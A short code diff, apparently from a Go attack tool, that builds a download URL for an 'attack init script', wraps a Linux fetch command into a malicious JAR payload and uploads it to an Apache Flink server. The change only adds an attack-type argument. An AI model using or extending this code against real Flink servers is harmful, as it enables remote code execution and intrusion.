@@ -47,7 +47,7 @@ isApachFlink := func (){
 uploadJar := func() {
 
     initUrl := attackScript.downloadInitUrl(host,port,AttackInitScriptName)
-    initDownloadCmd := attackScript.initCmdForLinux(initUrl)
+    initDownloadCmd := attackScript.initCmdForLinux(initUrl,ApacheFlinkAttackType)
 
     jarFilePath := attackScript.makeJarAttackPayload(initDownloadCmd)
 
